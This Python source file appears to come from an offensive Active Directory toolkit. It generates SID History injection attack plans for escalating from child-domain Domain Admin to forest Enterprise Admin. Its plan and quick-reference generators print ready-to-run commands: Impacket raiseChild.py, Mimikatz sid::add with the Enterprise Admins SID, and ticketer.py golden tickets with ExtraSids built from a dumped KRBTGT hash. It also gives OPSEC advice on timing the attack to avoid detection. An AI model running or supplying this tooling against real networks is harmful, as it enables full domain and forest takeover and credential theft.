"""
Attack Planner
Generate comprehensive attack plans for SID History exploitation
"""

from typing import Optional, List
from pathlib import Path
from datetime import datetime

from ..models import (
    DomainInfo,
    InjectionOperation,
    InjectionMethod,
    InjectionStatus,
    AttackScenario,
)
from ..utils.sid_utils import get_enterprise_admins_sid, get_schema_admins_sid


class AttackPlanner:
    """
    Generate attack plans for SID History injection scenarios
    """

    def __init__(self, output_dir: str = "sid_history", verbose: bool = True):
        """
        Initialize attack planner

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.verbose = verbose

    def log(self, message: str, level: str = "info") -> None:
        """Print status message"""
        if not self.verbose:
            return
        prefixes = {"info": "[*]", "success": "[+]", "error": "[-]", "warning": "[!]"}
        print(f"{prefixes.get(level, '[*]')} {message}")

    def create_child_to_parent_scenario(
            self,
            child_domain: DomainInfo,
            parent_domain: DomainInfo,
            target_user: str
    ) -> AttackScenario:
        """
        Create attack scenario for child-to-parent domain escalation

        Args:
            child_domain: Child domain info
            parent_domain: Parent/forest root domain info
            target_user: User to use for escalation

        Returns:
            AttackScenario object
        """
        self.log("Creating child-to-parent escalation scenario...")

        scenario = AttackScenario(
            name="Child-to-Parent Domain Escalation",
            description=(
                f"Escalate from Domain Admin on {child_domain.name} "
                f"to Enterprise Admin on {parent_domain.name} via SID History injection"
            ),
            source_domain=child_domain,
            target_domain=parent_domain,
            prerequisites=[
                f"Domain Admin access on {child_domain.name}",
                f"Network access to {child_domain.name} DC",
                f"Network access to {parent_domain.name} DC",
                "Mimikatz or Impacket tools",
            ],
            mitre_techniques=[
                "T1134.005 - Access Token Manipulation: SID-History Injection",
                "T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket",
                "T1003.006 - OS Credential Dumping: DCSync",
            ]
        )

        # Calculate target SID
        if parent_domain.sid:
            ea_sid = get_enterprise_admins_sid(parent_domain.sid)

            # Create injection operation
            operation = InjectionOperation(
                target_user=target_user,
                target_domain=child_domain.name,
                sid_to_inject=ea_sid,
                method=InjectionMethod.IMPACKET,
                dc_ip=child_domain.dc_ip
            )

            scenario.add_operation(operation)

        return scenario

    def create_forest_trust_scenario(
            self,
            source_forest: DomainInfo,
            target_forest: DomainInfo,
            target_user: str
    ) -> AttackScenario:
        """
        Create attack scenario for forest trust exploitation

        Args:
            source_forest: Source forest root domain
            target_forest: Target forest root domain
            target_user: User to use for escalation

        Returns:
            AttackScenario object
        """
        self.log("Creating forest trust exploitation scenario...")

        scenario = AttackScenario(
            name="Forest Trust Exploitation",
            description=(
                f"Exploit trust between {source_forest.name} and {target_forest.name} "
                f"to gain access as privileged user in target forest"
            ),
            source_domain=source_forest,
            target_domain=target_forest,
            prerequisites=[
                f"Domain Admin access on {source_forest.name}",
                "Bidirectional or outbound trust to target forest",
                "SID filtering disabled (or bypass technique)",
                "Trust key or ability to extract it",
            ],
            mitre_techniques=[
                "T1134.005 - Access Token Manipulation: SID-History Injection",
                "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
                "T1550.001 - Use Alternate Authentication Material: Application Access Token",
            ]
        )

        # Note: Forest trust attacks are more complex
        # SID filtering is usually enabled on forest trusts

        if target_forest.sid:
            # Try for Domain Admins in target (not EA since different forest)
            da_sid = f"{target_forest.sid}-512"

            operation = InjectionOperation(
                target_user=target_user,
                target_domain=source_forest.name,
                sid_to_inject=da_sid,
                method=InjectionMethod.MIMIKATZ,
                dc_ip=source_forest.dc_ip
            )

            scenario.add_operation(operation)

        return scenario

    def generate_attack_plan(
            self,
            scenario: AttackScenario
    ) -> str:
        """
        Generate detailed attack plan document

        Args:
            scenario: AttackScenario to document

        Returns:
            Formatted attack plan string
        """
        lines = [
            "=" * 70,
            f"ATTACK PLAN: {scenario.name.upper()}",
            "=" * 70,
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "SCENARIO OVERVIEW",
            "-" * 40,
            scenario.description,
            "",
            "CURRENT POSITION",
            "-" * 40,
            f"  Domain: {scenario.source_domain.name}",
            f"  Domain SID: {scenario.source_domain.sid or 'Unknown'}",
            f"  DC: {scenario.source_domain.dc_hostname or scenario.source_domain.dc_ip or 'Unknown'}",
            "",
            "TARGET",
            "-" * 40,
            f"  Domain: {scenario.target_domain.name}",
            f"  Domain SID: {scenario.target_domain.sid or 'Unknown'}",
            f"  Forest Root: {scenario.target_domain.is_forest_root}",
            "",
            "PREREQUISITES",
            "-" * 40,
        ]

        for i, prereq in enumerate(scenario.prerequisites, 1):
            lines.append(f"  {i}. {prereq}")

        lines.extend([
            "",
            "ATTACK STEPS",
            "-" * 40,
        ])

        # Generate steps based on operations
        step = 1
        for op in scenario.injection_operations:
            lines.append(f"\n  Step {step}: Get Domain Admin on {scenario.source_domain.name}")
            lines.append(f"           (Assumed complete)")
            step += 1

            lines.append(f"\n  Step {step}: Enumerate Target SID")
            lines.append(f"           Target SID: {op.sid_to_inject}")
            lines.append(f"           This grants: {op.sid_description}")
            step += 1

            if op.method == InjectionMethod.IMPACKET:
                lines.append(f"\n  Step {step}: Execute raiseChild.py (Automated)")
                lines.append(
                    f"           Command: raiseChild.py {op.target_domain}/admin:'password'@{op.dc_ip or 'DC_IP'}")
                lines.append(f"           This will automatically:")
                lines.append(f"             - Create Golden Ticket with ExtraSids")
                lines.append(f"             - Request inter-realm TGT")
                lines.append(f"             - DCSync parent domain")
            else:
                lines.append(f"\n  Step {step}: Inject SID History (Mimikatz)")
                lines.append(f"           Run on DC: mimikatz")
                lines.append(f"           Command: sid::add /sam:{op.target_user} /new:{op.sid_to_inject}")

            step += 1

            lines.append(f"\n  Step {step}: Verify Access")
            lines.append(f"           Authenticate as {op.target_user}")
            lines.append(f"           Access {scenario.target_domain.name} resources")
            lines.append(f"           You now have {op.sid_description} rights!")

        lines.extend([
            "",
            "MITRE ATT&CK TECHNIQUES",
            "-" * 40,
        ])

        for technique in scenario.mitre_techniques:
            lines.append(f"  • {technique}")

        lines.extend([
            "",
            "OPSEC CONSIDERATIONS",
            "-" * 40,
            "  • DCSync and sid::add create detectable events",
            "  • Monitor for Event ID 4662 (Directory Service Access)",
            "  • Golden Ticket creation may trigger alerts",
            "  • Use during high-activity periods",
            "",
            "CLEANUP",
            "-" * 40,
            "  • SID History can be removed with sid::clear",
            "  • Reset KRBTGT twice to invalidate Golden Tickets",
            "  • Clear Kerberos ticket cache on endpoints",
            "",
            "=" * 70,
        ])

        return "\n".join(lines)

    def save_attack_plan(self, scenario: AttackScenario) -> Path:
        """
        Save attack plan to file

        Args:
            scenario: AttackScenario to save

        Returns:
            Path to saved file
        """
        plan = self.generate_attack_plan(scenario)

        filename = f"attack_plan_{scenario.source_domain.name}_to_{scenario.target_domain.name}.txt"
        filepath = self.output_dir / filename

        filepath.write_text(plan)

        self.log(f"Attack plan saved to: {filepath}", "success")

        return filepath

    def print_attack_plan(self, scenario: AttackScenario) -> None:
        """Print attack plan to console"""
        plan = self.generate_attack_plan(scenario)
        print(plan)

    def generate_quick_reference(
            self,
            current_domain: str,
            forest_root: str,
            compromised_user: str
    ) -> str:
        """
        Generate quick reference card for attack

        Args:
            current_domain: Current (child) domain
            forest_root: Forest root domain
            compromised_user: Compromised DA user

        Returns:
            Quick reference string
        """
        lines = [
            "",
            "=" * 60,
            "SID HISTORY ATTACK QUICK REFERENCE",
            "=" * 60,
            "",
            f"Current Position: {compromised_user} (Domain Admin) on {current_domain}",
            f"Target: Enterprise Admin on {forest_root}",
            "",
            "QUICK COMMANDS",
            "-" * 40,
            "",
            "Option 1: Impacket (Automated, Recommended)",
            f"  raiseChild.py {current_domain}/administrator:password@dc.{current_domain}",
            "",
            "Option 2: Mimikatz (Manual)",
            f"  # On DC of {current_domain}:",
            f"  mimikatz # privilege::debug",
            f"  mimikatz # sid::add /sam:{compromised_user} /new:FOREST-ROOT-SID-519",
            "",
            "Option 3: Golden Ticket with ExtraSids",
            f"  # After dumping child KRBTGT:",
            f"  ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD_SID \\",
            f"    -domain {current_domain} -extra-sid PARENT_SID-519 administrator",
            "",
            "=" * 60,
        ]

        return "\n".join(lines)